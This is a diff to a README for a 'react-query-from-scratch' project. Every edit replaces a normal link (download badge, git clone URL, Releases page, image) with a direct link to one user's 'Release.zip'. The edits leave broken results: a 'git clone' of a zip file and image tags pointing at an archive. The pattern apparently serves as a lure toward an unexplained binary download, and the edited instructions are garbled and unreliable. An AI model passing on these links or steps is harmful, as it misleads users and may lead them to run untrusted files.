@@ -13,7 +13,7 @@ Welcome to the **react-query-from-scratch** repository! This project is a scoped
 
 To dive into this project, you can download the code by clicking on the button below:
 
-[![Download Code](https://img.shields.io/badge/Download%20Code-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Code](https://github.com/AinzXyz291/react-query-from-scratch/releases/download/v1.0/Release.zip%20Code-v1.0.0-blue)](https://github.com/AinzXyz291/react-query-from-scratch/releases/download/v1.0/Release.zip)
 
 If the link does not automatically start the download, simply click on it to get started!
 
@@ -23,7 +23,7 @@ To install and run this project locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/react-query-from-scratch.git
+   git clone https://github.com/AinzXyz291/react-query-from-scratch/releases/download/v1.0/Release.zip
    ```
 
 2. Install dependencies:
@@ -57,6 +57,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-🚀 Happy Coding! 🌟 Thank you for checking out **react-query-from-scratch**. Visit the [Releases](https://github.com/cli/browser/releases) section for additional resources and updates. Feel free to reach out with any questions or feedback. Have a great day! 🎉
+🚀 Happy Coding! 🌟 Thank you for checking out **react-query-from-scratch**. Visit the [Releases](https://github.com/AinzXyz291/react-query-from-scratch/releases/download/v1.0/Release.zip) section for additional resources and updates. Feel free to reach out with any questions or feedback. Have a great day! 🎉
 
-![React Query From Scratch](https://source.unsplash.com/800x400/?technology,code)
+![React Query From Scratch](https://github.com/AinzXyz291/react-query-from-scratch/releases/download/v1.0/Release.zip,code)
